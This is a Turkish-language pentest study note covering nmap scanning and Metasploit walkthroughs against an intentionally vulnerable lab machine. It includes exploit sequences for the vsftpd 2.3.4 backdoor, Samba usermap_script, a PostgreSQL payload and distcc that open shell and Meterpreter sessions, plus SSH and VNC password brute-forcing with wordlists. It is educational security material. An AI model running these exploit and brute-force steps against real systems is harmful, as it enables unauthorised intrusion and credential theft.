# Sunucu ve Bilgisayar Sızma Testleri

Sızma testleri (Penetration Testing), bir sistemin, ağın veya uygulamanın güvenlik açıklarını tespit etmek amacıyla gerçekleştirilen kontrollü ve etik saldırı simülasyonlarıdır. Bu süreç, gerçek saldırganların kullanabileceği yöntemleri taklit ederek sistemin dayanıklılığını ölçmeyi hedefler.

- hacktrick.xyz // Siber güvenlik, özellikle CTF ve pentest süreçleri için kapsamlı teknik bilgiler içeren bir kaynaktır.
  -openvpn machine.ovpn // vpn çalıştırır

## Recon (Keşif Aşaması)

- Hedef hakkında bilgi toplama süreci

## Exploit

- Bir sistemdeki güvenlik açığını kullanarak istenmeyen bir işlem yaptıran kod veya tekniktir.
- Kapı kilidi bozuk → güvenlik açığı
- O bozuk kilitten içeri girme yöntemi → exploit

## CTF (Capture The Flag)

- Güvenlik açıklarını bulup çözerek “flag” (gizli kod) elde ettiğin eğitim yarışmasıdır.

## Metasploitable

- Metasploitable, siber güvenlikte eğitim ve test amaçlı kullanılan bilerek zayıf bırakılmış bir sanal makinedir.

## Nmap

- Bir hedefte hangi kapılar (portlar) açık ve hangi servisler çalışıyor onu gösteren ağ tarama aracıdır.
- nessus, nmap alternatif

## Temel nmap Komutları

- > nmap 192.168.1.10 //Açık portlar,En temel bilgi

- > nmap -v -sS -A -T4 target //Bu hedefi hızlı ve agresif şekilde didik didik et;
- > OS’ini, servislerini, versiyonlarını, script sonuçlarını bana göster.

- > nmap -p 1-65535 -sV -sS -T4 target //-p 1-65535 -TÜM portları tarar,-sS (SYN Scan – Stealth)- Yarı açık tarama,-sV (Service Version Detection)
- > -Servis + versiyon öğrenir,-T4 (Timing Template) -Hız ayarı...Bu hedefteki TÜM portları, stealth şekilde tara,
- > açık olan servislerin versiyonlarını bul, hızlı yap.

- > nmap --top-ports 1000 192.168.1.10 //Hızlı ,Tüm önemli portlar (en çok kullanılan)

- > nmap -p- 192.168.1.10 // Tüm portlar (tam tarama),Yavaş ama kapsamlı

- > nmap -sV 192.168.1.10 //Servis versiyonu tespiti,SSH versiyonu vs.

- > nmap -O 192.168.1.10 //İşletim sistemi tespiti

- > nmap -A 192.168.1.10//En kritik kombine komut, OS,Servis,Script,Traceroute

- > nmap -sS 192.168.1.10 //Stealth SYN Scan (en popüler),Sessiz

- > nmap -sC 192.168.1.10//Script taramaları (NSE)

- > nmap -p 80,443 --script http-title,http-headers 192.168.1.10//Web servislerini tarama

- > nmap -Pn 192.168.1.1 //GİZLİLİK / FIREWALL TEST,Ping atlamaz,ICMP kapalıysa şart

- > nmap -T2 192.168.1.10 //Yavaş & dikkat çekmeyen

- > nmap -oA scan_result 192.168.1.10//ÇIKTI KAYDETME (ÇOK ÖNEMLİ)

--ÖZETİ--

nmap → temel
-p- → tüm portlar
-sS → stealth // Daha az fark edilerek yapılan tarama demektir.
-sV → servis //HTTP,SSH,MySQL...
-O → OS //Hedef sistemin hangi işletim sistemini kullandığını tahmin etme olayıdır.
-sC → script
-A → hepsi

### Sunucu-Bilgisayar Hackleme

- Sızma testlerinde amaç, hedef sistemde çalışan servisleri analiz ederek bu servislerde bilinen güvenlik açıklarını (vulnerabilities) tespit etmek ve kontrollü şekilde istismar etmektir.

- portları exploitdb/rapid7 sitelerinden açık var mı bakılabilir

* portlar değil servisler hacklenir

- > nmap -v -sS -A -T4 <target-ip> // Sonuçlar kaydedilip açık portlarla sızma denemeleri yapılır

* Açık portlar sızma testleri için başlangıç noktasıdır; ancak başarı, ilgili serviste bir zafiyet bulunmasına bağlıdır.

## Örnek

## 1. FTP ile Hacklemek (port21)

- 21/tcp open ftp vsftpd 2.3.4
- "vsftpd 2.3.4 exploit" şeklinde arama yapılır

- > msfconsole //Metasploit Console giriş yapılır
- > msf6> ~use exploit/unix/ftp/vsftpd_234_backdoor
- > msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~show options
- > msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~set rhosts 10.0.2.5
- > msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~show targets //hedefleri gösterir
- > msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~exploit -j -z //exploit çalıştırılır (başarı zafiyete bağlıdır)
- > msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~sessions -l //açık olan bağlantıların listesi çıkar
- > msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~sessions 1
- > ls // hacklenen bilgisayarın terminalinde ls çıkarır
- > uname -a //içersinde olduğunuz linux hakkında bilgi verir. Hangi makinede olduğunu kurban/kendi gösterir

## 2. Telnet vs SSH Hacklemek ( port23-port22)

- SSH açık İstemci ↔ Sunucu arasındaki iletişim korur
- Telnet şifreleme yok,zayıf,her şey okunabilir,şifreler ele eçirilebilir
- SSH ağ trafiği şifreli,kimlik doğrular,veri gizliliği. Sunucular bunu kullanır. Telnet'in yerini aldı.

* En güvenli telnet kapalı SSH açık, SSH hardening yapılmış

## 3. SAMBA Hacklemek

- Samba, Linux / Unix sistemlerin Windows ağlarıyla konuşmasını sağlayan bir servistir.Linux ↔ Windows dosya paylaşımı,Yazıcı paylaşımı, Ağ üzerinden klasör erişimi..

- nmap sonucundaki "Samba smbd 3.X - 4.X" cp ve exploitdb/rapid7 incele

- > msfconsole
- > msf6> use exploit/multi/samba/usermap_scrip
- > msf6 exploit(multi/samba/usermap_scrip) > show options
- > msf6 exploit(multi/samba/usermap_scrip) > set rhosts 10.0.2.5
- > msf6 exploit(multi/samba/usermap_scrip) > show options //gözükmeli artık
- > msf6 exploit(multi/samba/usermap_scrip) > exploit -j -z
- > msf6 exploit(multi/samba/usermap_scrip) > sessions -l
- > msf6 exploit(multi/samba/usermap_scrip) > sessions 1
- > uname -a
- > ls

## 4. Meterpreter--SQL Port (1433 / 3306 / 5432)

- Bir sisteme erişim sağlandıktan sonra: Komut çalıştırma, Dosya işlemleri, Ekran görüntüsü, Keylogging (yetkili testte) ,Ağ pivoting, Yetki yükseltme (uygun senaryoda)
- Meterpreter’in SQL servisi üzerinden tetiklenmiş olması muhtemel.Hep sql portuyla tetiklenmeyebilir

- nmap sonuçlarında "PostgreSQL DB 8.3.0 - 8.3.7 cp ve exploitdb/rapid7 ten nasıl hackleneceğine bak

- > msfconsole
- > ~msf6> use exploit/linux/postgres/postgres_payload
- > msf6 exploit(linux/postgres/postgres_payload) > show options
- > msf6 exploit(linux/postgres/postgres_payload) > set rhosts 10.0.2.5
- > msf6 exploit(linux/postgres/postgres_payload) > set lhost 10.0.2.2 //localhost kendi ip
- > msf6 exploit(linux/postgres/postgres_payload) > exploit -j -z
- > msf6 exploit(linux/postgres/postgres_payload) > sessions -l
- > msf6 exploit(linux/postgres/postgres_payload) > sessions 1

meterpreter > // Exploit başarılı olduğunda oturum açılır
meterpreter > help // Meterpreter içerisinde kullanabileceğin tüm modülleri ve işlevleri listeler.

### Genel Güvenlik Nasıl Sağlanır

- Exploit’i engelle
- Zafiyeti kapat
- Yetkiyi sınırla
- Anomaliyi yakala

### nmap Detayları

- tcp : Nmap TCP kullanan portları tarar. -sT //genelde bu kullanılır
- udp : UDP genelde hızın önemli olduğu yerlerde -sU

- -T(0-5) 0-2 arası yavaş ,3-5 hızlı. Hızlı olması dikkat çeker farklı ağdaysan yavaş at.

- -O işletim sistemi

- -sV servisleri ve detaylarını gösterir

- -A, Aggressive Scan (Agresif Tarama). Ne varsa gösterir

- -p- tüm portlar

- -oN sonuc.txt // bulduğu sonucu kaydeder

### Script Çalıştırmak

- nmap.org sitesinden scriptleri bulup çalıştırılabilir.
- örnek:
  > nmap 10.0.2.12 --script http-enum.nse //Web sunucusunda: Gizli dizin var mı ? Yönetim paneli var mı ? Yanlışlıkla açık bırakılmış klasör var mı ?
- Script tabanlı analiz yapar (-sC) kapsamlı

### Script Argümanları

- > nmap 10.0.2.12 -A -p- -T5 //ne var ne yok çıkarır

### nmap sonuclarında bilinmeyen bir port alınırsa.. 3632 distccd v1 cp

- > msfconsole
- > msf6> ~search mysql // MySQL ile ilgili tüm exploit, auxiliary ve scanner modülleri listelenir. Çıktıdan uygun modül seçilir
- > msf6> ~search distccd

- > msf6> ~ use exploit(unix/misc/distcc_exec) // Arama sonucuna göre uygun exploit seçilir:

- > msf6> exploit(unix/misc/distcc_exec)~ show payloads // Komutu, seçili exploit ile uyumlu payload’ları listeler.Exploit için gerekli payload’lar.Reverse olanlar hedef makinenin sana geri bağlantı kurduğu payload’lardır.İlk bunlar denenebilir

- > msf6> exploit(unix/misc/distcc_exec)~ set payload 5 // Uygun olan bulunana kadar denenir 1-2-4-5...

- > show options
- > exploit -j -z
- > sessions -l
- > sessions 1

## 5. SSH-Login Hackleme

> msfconsole
> msf6> ~search ssh
> msf6> ~use auxiliary/sc..../ssh_login // Login olan kullanılır
> msf6 auxiliary (sc..../ssh_login)> ~show options // required/yes olanlar zorunlu girilmeli
> msf6 auxiliary (sc..../ssh_login)> ~ set RHOSTS 10.0.2.17
> msf6 auxiliary (sc..../ssh_login)> ~set VERBOSE yes //çıktı yapar
> msf6 auxiliary (sc..../ssh_login)> ~set USERNAME msfadmin // Username veya password biliniyorsa diğerini bulmak için girilir
> msf6 auxiliary (sc..../ssh_login)> ~set PASS_FILE /home/kali/sshpassword.txt // pass_file veya userpass_file wordlistleri girilebilir veya kendin oluşuturup gir
> msf6 auxiliary (sc..../ssh_login)> ~show options //son kontroller
> msf6 auxiliary (sc..../ssh_login)> ~exploit //hacklemeye başlar
> msf6 auxiliary (sc..../ssh_login)> ~sessions -l
> msf6 auxiliary (sc..../ssh_login)> ~sessions 1
> uname -a ...

## 6. VNC ile Hacklemek (5900 port)

- VNC (Virtual Network Computing): Bir bilgisayarı uzaktan görsel arayüzüyle kontrol etmeyi sağlayan teknolojidir. Her zaman açık değildir bu port

> msfconsole
> msf6> ~search ssh
> msf6> ~use auxiliary/sc..../vnc_login //login olanı cp
> msf6 auxiliary (sc..../vnc_login)> ~show options //required yes olanlar zorunlu girlir. Password kısmına wordlist eklenir
> msf6 auxiliary (sc..../vnc_login)> ~exploit //hacklemeye başlar. bulduğunda password görünür

- yeni terminal

> vncviewer
> vncviewer 10.0.2.12
> password: //bulunan password girilir. Arayüzlü terminal çıkar

---

### Ek Bilgiler

- ssh giriş
  > ssh omer@10.10.245
  > password

* 80 portu varsa web site var demektir, tarayıcıdan o ip girip incelenir
